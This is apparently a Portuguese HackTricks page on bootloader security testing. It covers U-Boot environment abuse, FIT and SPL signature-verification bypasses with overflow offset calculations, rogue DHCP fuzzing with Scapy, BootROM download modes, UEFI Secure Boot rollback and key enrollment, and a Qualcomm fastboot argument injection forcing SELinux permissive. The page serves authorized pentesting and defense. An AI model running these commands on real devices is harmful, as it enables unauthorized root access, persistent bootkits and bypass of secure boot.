# Teste do Bootloader

{{#include ../../banners/hacktricks-training.md}}

As etapas a seguir são recomendadas para modificar configurações de inicialização do dispositivo e testar bootloaders como U-Boot e carregadores da classe UEFI. Concentre-se em obter execução de código antecipada, avaliar proteções de assinatura/rollback e abusar de caminhos de recuperação ou inicialização pela rede.

Relacionado: bypass do secure boot do MediaTek via patching de bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Vitórias rápidas no U-Boot e abuso do ambiente

1. Acesse o shell do interpretador
   - Durante a inicialização, pressione uma tecla de interrupção conhecida (geralmente qualquer tecla, 0, espaço ou uma sequência "mágica" específica da placa) antes da execução de `bootcmd` para acessar o prompt do U-Boot.<sup>[[1]](#references)</sup>

2. Inspecione o estado e as variáveis de inicialização
   - Comandos úteis:
     - `printenv` (exibe o ambiente)
     - `bdinfo` (informações da placa, endereços de memória)
     - `help bootm; help booti; help bootz` (métodos de inicialização do kernel compatíveis)
     - `help ext4load; help fatload; help tftpboot` (carregadores disponíveis)

3. Modifique os argumentos de inicialização para obter um shell root
   - Acrescente `init=/bin/sh` para que o kernel abra um shell em vez de executar o init normal:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot a partir do seu servidor TFTP
   - Configure a rede e obtenha uma imagem kernel/fit da LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Persistir alterações por meio do ambiente
   - Se o armazenamento de env não estiver protegido contra gravação, você poderá persistir o controle:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Verifique variáveis como `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` que influenciam os caminhos de fallback. Valores mal configurados podem permitir entrar repetidamente no shell.

6. Verifique recursos de depuração/inseguros
   - Procure: `bootdelay` > 0, `autoboot` desativado, `usb start; fatload usb 0:1 ...` sem restrições, possibilidade de usar `loady`/`loads` via serial, `env import` de mídias não confiáveis e kernels/ramdisks carregados sem verificações de assinatura.

7. Teste de imagens/verificação do U-Boot
   - Se a plataforma afirma usar secure/verified boot com imagens FIT, tente imagens sem assinatura e adulteradas:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - A ausência de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou o comportamento legado de `verify=n` muitas vezes permite inicializar payloads arbitrários.
   - Não pare em um simples resultado de permitir/negar: pesquisas recentes sobre FIT mostraram que o próprio caminho de verificação pode ser uma superfície de ataque pré-autenticação. Faça testes negativos com dados FIT armazenados externamente (`data-offset`, `data-position`, `data-size`), seleção de configuração assinada, `loadables` e tratamento de overlay / `extra-conf`.
   - Se você tiver uma árvore de código-fonte correspondente, `test/vboot/vboot_test.sh` é uma maneira rápida de reproduzir o comportamento de verificação de FIT no sandbox do U-Boot antes de mexer no hardware real.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` e fluxos de inicialização por script
   - Em builds modernos do U-Boot, `bootcmd` costuma ser apenas um wrapper em torno do Standard Boot. Isso significa que mídias graváveis, PXE ou flash SPI podem se tornar o verdadeiro limite de confiança, mesmo quando o ambiente visível parece inofensivo.
   - O `bootmeth` de `extlinux` procura `extlinux/extlinux.conf` em `/` e `/boot`; o `bootmeth` de script procura primeiro `boot.scr.uimg` e depois `boot.scr`. Na inicialização pela rede, o nome do script pode vir de `boot_script_dhcp`.
   - Comandos úteis para triagem:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Casos de abuso a testar: mídia USB/SD controlada pelo atacante antes de `boot_targets`, `/boot/extlinux/extlinux.conf` gravável, servidor TFTP malicioso fornecendo `boot.scr` ou execução de script via SPI usando `script_offset_f`.
   - Se a plataforma depender da verificação de FIT, certifique-se de que as configurações sejam assinadas no nível da configuração, e não apenas por imagem; `required-mode=all` é mais rigoroso do que aceitar qualquer chave obrigatória individual.

### Dados FIT externos do SPL copiados antes da verificação

No carregamento de FIT pelo SPL, uma assinatura de configuração intacta não torna seguros os metadados de payload externos. O U-Boot exclui `data-position`, `data-offset` e `data-size` das propriedades de configuração assinadas. Nos caminhos afetados de `load_simple_fit()`, o SPL deriva desses campos um deslocamento de origem e um comprimento de cópia, e então chama `info->read()` **antes** de verificar o hash da imagem. Portanto, um FIT criado especialmente em uma mídia de boot gravável pode sobrescrever RAM sem falsificar uma assinatura. A propriedade assinada `load` normalmente fixa o destino; portanto, primeiro determine se uma cópia de tamanho excessivo pode alcançar o stack ou outros dados de controle a partir desse endereço.<sup>[[15]](#references)[[16]](#references)</sup>

Rastreie o loader real da placa e o mapa de memória, em vez de presumir uma leitura de flash: o loader RAM demonstrado chegou a `spl_ram_load_read()` e `memcpy()`. No ponto da chamada, registre `fit_offset` e qualquer endereço base FIT adicionado pelo leitor, o comprimento de bloco do loader (`spl_get_bl_len(info)`), qualquer alinhamento específico do fork, o `read_offset` e o `size` resultantes, o destino `src_ptr` e a localização do endereço de retorno salvo. Verifique se uma região de origem mapeada contígua cobre a distância de cópia necessária, se ela se sobrepõe ao destino e se os bytes na posição de origem podem fornecer um ponteiro para dados FIT controlados pelo atacante. A [partial return-address overwrite technique](../../binary-exploitation/stack-overflow/ret2win/) genérica se aplica se um ponteiro completo não puder satisfazer as restrições de alinhamento do loader.<sup>[[16]](#references)</sup>

Na build de teste de 32 bits do AST2600 dos pesquisadores, `src_ptr` era `0x80001000` e o endereço de retorno salvo de `memcpy` ficava em `0x902ffe24`. Eles usaram uma build upstream modificada com os helpers de posicionamento do stack e alinhamento do OpenBMC: o leitor RAM adicionava uma base FIT de `0x10000`, e esses helpers arredondavam o deslocamento de origem para baixo até `ARCH_DMA_MINALIGN` (64 bytes). Um ponteiro little-endian útil em `0x902fffe4` e uma cópia terminando um byte antes alteraram apenas os três bytes menos significativos do endereço de retorno salvo, preservando seu byte superior zero, já conhecido. O loader RAM upstream, por sua vez, usa um comprimento de bloco de um byte; portanto, esse alinhamento de 64 bytes e a solução alternativa de sobrescrita parcial não são requisitos gerais do SPL. Recalcule os endereços, o comprimento de bloco do loader e a extensão da cópia para cada build. No cálculo original abaixo, `fit_offset` representa a adição efetiva da base FIT pelo leitor RAM, e não necessariamente o argumento passado a `load_simple_fit()`.<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

A correção upstream limita tanto o `data-size` bruto quanto o tamanho de transferência **alinhado a blocos** antes de `info->read()`. O caminho de overlay passa a capacidade real do buffer, enquanto outros chamadores usam `CONFIG_SYS_BOOTM_LEN`, que é apenas um limite superior amplo, e não uma garantia de que o destino tenha essa quantidade de memória livre. Ao avaliar um fork do fornecedor, verifique se essas checagens estão presentes e compare o intervalo de cópia permitido com a pilha SPL real da placa e as regiões reservadas.<sup>[[15]](#references)[[16]](#references)</sup>

## Superfície de inicialização pela rede (DHCP/PXE) e servidores invasores

9. Fuzzing de parâmetros PXE/DHCP
   - O tratamento legado de BOOTP/DHCP do U-Boot teve problemas de segurança de memória. Por exemplo, o CVE‑2024‑42040 descreve a divulgação de memória por meio de respostas DHCP manipuladas, que podem vazar bytes da memória do U-Boot pela rede.<sup>[[4]](#references)</sup> Exercite os caminhos de código DHCP/PXE com valores excessivamente longos ou casos extremos (nome de arquivo de inicialização da opção 67, opções de fornecedor, campos `file`/`servername`) e observe se ocorrem travamentos ou vazamentos.
   - Trecho mínimo de Scapy para testar parâmetros de inicialização durante o boot pela rede:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Valide também se os campos de nome de arquivo PXE são passados à lógica do shell/loader sem sanitização quando encadeados a scripts de provisionamento do lado do sistema operacional.

10. Testes de command injection em servidor DHCP rogue
   - Configure um serviço DHCP/PXE rogue e tente injetar caracteres nos campos de nome de arquivo ou opções para alcançar interpretadores de comandos em etapas posteriores da cadeia de boot. O auxiliar DHCP do Metasploit, `dnsmasq` ou scripts personalizados do Scapy funcionam bem. Isole a rede de laboratório antes de começar.

## Modos de recuperação da ROM do SoC que substituem o boot normal

Muitos SoCs expõem um modo "loader" de BootROM que aceita código por USB/UART mesmo quando as imagens do flash são inválidas. Se os eFuses de secure boot não estiverem gravados, isso pode permitir execução arbitrária de código logo no início da cadeia.

- NXP i.MX (Serial Download Mode)
  - Ferramentas: `uuu` (mfgtools3) ou `imx-usb-loader`.
  - Exemplo: `imx-usb-loader u-boot.imx` para enviar e executar um U-Boot personalizado a partir da RAM.
- Allwinner (FEL)
  - Ferramenta: `sunxi-fel`.
  - Exemplo: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ou `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Ferramenta: `rkdeveloptool`.
  - Exemplo: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` para carregar um loader e enviar um U-Boot personalizado.

Avalie se os eFuses/OTP de secure boot do dispositivo estão gravados. Caso contrário, os modos de download da BootROM frequentemente ignoram qualquer verificação de nível superior (U-Boot, kernel, rootfs) ao executar sua carga útil de primeiro estágio diretamente da SRAM/DRAM.

## Bootloaders UEFI/PC: verificações rápidas

11. Testes de adulteração do ESP, rollback e cadastro de chaves
   - Monte a EFI System Partition (ESP) e verifique os componentes do loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, caminhos de logotipos do fabricante.
   - Quando possível, extraia o estado do Secure Boot e os bancos de dados de chaves do sistema operacional:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Se a plataforma estiver em Setup Mode, aceitar o cadastro de chaves sem autenticação ou vier de fábrica com uma Platform Key de teste/padrão (classe PKfail), um administrador local ou atacante com acesso físico poderá cadastrar sua própria KEK/db e manter o Secure Boot aparentemente “habilitado” enquanto inicializa binários EFI arbitrários.<sup>[[3]](#references)</sup>
   - Tente inicializar com componentes de boot assinados vulneráveis conhecidos ou de versões anteriores, caso as revogações do Secure Boot (`dbx`) não estejam atualizadas. Se a plataforma ainda confiar em shims/bootmanagers antigos, muitas vezes você poderá carregar seu próprio kernel ou `grub.cfg` a partir da ESP para obter persistência.
   - No Windows, hosts corrigidos ainda podem aceitar boot managers assinados vulneráveis se o signatário `Microsoft Windows Production PCA 2011` continuar ausente do `dbx` do firmware, como observado com BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Um bypass no estilo Baton Drop pode cadastrar um MOK do atacante; um shim legítimo poderá então carregar um payload EFI assinado por essa chave em inicializações posteriores.<sup>[[12]](#references)[[13]](#references)</sup> Revogar posteriormente o antigo signatário do Windows não remove o MOK cadastrado, então o caminho baseado em shim pode persistir se esse shim continuar confiável.<sup>[[12]](#references)</sup>
   - Antes de testar esse caminho de rollback em uma máquina UEFI autorizada, verifique o **estado efetivo das revogações do firmware**, não apenas o histórico de atualizações do Windows.<sup>[[13]](#references)[[14]](#references)</sup> A Microsoft fornece esta verificação somente leitura no PowerShell elevado para o signatário de 2011 no `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` é apenas uma pista: confirme o componente de boot assinado específico e outras revogações em um laboratório recuperável.<sup>[[12]](#references)[[14]](#references)</sup> Uma atualização pendente do registro ou um certificado de assinatura expirado não equivale a uma revogação `dbx` concluída.<sup>[[13]](#references)[[14]](#references)</sup>

12. Teste de revogação de shim / SBAT / dbx desatualizados
   - Shims antigos assinados pela Microsoft e forks de fornecedores ainda podem servir como um caminho de bootkit no estilo BYOVD se as revogações estiverem desatualizadas. Em um laboratório isolado, coloque um shim historicamente vulnerável na ESP e tente encadear o carregamento do seu próprio `grubx64.efi` ou kernel.<sup>[[11]](#references)</sup>
   - Triagem rápida:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Se o shim ainda for executado apesar de estar na lista de revogação, o firmware/OS tem atualizações `dbx` desatualizadas ou confia em um loader forked que nunca herdou as proteções SBAT upstream.

13. Bugs de parsing do logo de boot (classe LogoFAIL)
   - Vários firmwares de OEM/IBV eram vulneráveis a falhas de parsing de imagens no DXE, que processa logos de boot. Se um atacante puder colocar uma imagem criada especialmente na ESP, em um caminho específico do fornecedor (por exemplo, `\EFI\<vendor>\logo\*.bmp`), e reiniciar o dispositivo, pode ser possível executar código durante o início do boot, mesmo com Secure Boot habilitado. Teste se a plataforma aceita logos fornecidos pelo usuário e se esses caminhos podem ser gravados pelo OS.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16): lacunas de confiança

Em dispositivos Android 16 que usam o ABL da Qualcomm para carregar a **Generic Bootloader Library (GBL)**, verifique se o ABL **autentica** o app UEFI carregado da partição `efisp`. Se o ABL verificar apenas a **presença** de um app UEFI e não verificar as assinaturas, uma primitiva de escrita em `efisp` permite **execução de código não assinado antes do OS** durante o boot.<sup>[[6]](#references)[[7]](#references)</sup>

Verificações práticas e caminhos de abuso:

- **Primitiva de escrita em `efisp`**: Você precisa de uma forma de gravar um app UEFI personalizado em `efisp` (root/serviço privilegiado, bug em app OEM, caminho de recovery/fastboot). Sem isso, a lacuna no carregamento do GBL não pode ser explorada diretamente.<sup>[[6]](#references)</sup>
- **Injeção de argumentos OEM via fastboot** (bug no ABL): Algumas builds aceitam tokens extras em `fastboot oem set-gpu-preemption` e os acrescentam à linha de comando do kernel. Isso pode ser usado para forçar o SELinux permissivo, permitindo a escrita em partições protegidas:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Se o dispositivo estiver corrigido, o comando deverá rejeitar argumentos extras.<sup>[[5]](#references)[[6]](#references)</sup>
- **Desbloqueio do bootloader via flags persistentes**: Uma carga útil executada durante a inicialização pode alterar flags persistentes de desbloqueio (por exemplo, `is_unlocked=1`, `is_unlocked_critical=1`) para simular `fastboot oem unlock` sem as verificações de servidor/aprovação do OEM. Essa alteração de estado persiste após a próxima reinicialização.<sup>[[6]](#references)</sup>

Notas defensivas/de triagem:

- Confirme se o ABL verifica a assinatura da carga útil GBL/UEFI recebida de `efisp`. Caso contrário, trate `efisp` como uma superfície de persistência de alto risco.
- Verifique se os manipuladores OEM do fastboot do ABL foram corrigidos para **validar a quantidade de argumentos** e rejeitar tokens adicionais.<sup>[[8]](#references)[[9]](#references)</sup>

## Cuidados com o hardware

Tenha cuidado ao interagir com a flash SPI/NAND durante a inicialização (por exemplo, aterrando pinos para contornar leituras) e sempre consulte a folha de dados da flash. Curtos-circuitos no momento errado podem corromper o dispositivo ou o programador.

## Observações e dicas adicionais

- Tente `env export -t ${loadaddr}` e `env import -t ${loadaddr}` para transferir blobs do ambiente entre a RAM e o armazenamento; algumas plataformas permitem importar o env de mídia removível sem autenticação.
- Para obter persistência em sistemas baseados em Linux que inicializam via `extlinux.conf`, geralmente basta modificar a linha `APPEND` (para injetar `init=/bin/sh` ou `rd.break`) na partição de inicialização quando não há verificações de assinatura.
- Se o alvo usar atualizações de slot duplo/A/B, revise as técnicas anti-rollback e de dessincronização de slots na [visão geral da análise de firmware](README.md) para não deixar passar lacunas de confiança exclusivas do atualizador que estejam fora do próprio bootloader.
- Se o userland disponibilizar `fw_printenv/fw_setenv`, valide se `/etc/fw_env.config` corresponde ao armazenamento real do env. Deslocamentos mal configurados permitem ler/gravar na região MTD errada.

## References

- [1] [Metodologia de teste de segurança de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Encontrando o LogoFAIL: os perigos da análise de imagens durante a inicialização do sistema](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: chaves de plataforma não confiáveis comprometem o Secure Boot no ecossistema UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Detalhes da CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: desbloqueando dispositivos Xiaomi por meio de duas strings não sanitizadas](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Exploit do GBL do Qualcomm Snapdragon 8 Elite permite que invasores desbloqueiem bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Arquitetura do Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: corrigir a propagação de entrada não confiável para a linha de comando do kernel](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: adicionar verificação ao comando set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Inapto para inicializar: quebrando a verificação de assinatura FIT do U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Nota sobre vulnerabilidade VU#616257 - carregadores de inicialização shim UEFI assinados pela Microsoft vulneráveis a bypass do Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [Bootkit UEFI BlackLotus: mito confirmado](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: um bootkit UEFI semelhante ao BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Como gerenciar as revogações do Windows Boot Manager para alterações no Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [Patch do U-Boot: limitar o tamanho dos dados externos antes de lê-los](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [Benefícios ocultos: contornando a verificação de assinatura no U-Boot SPL](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
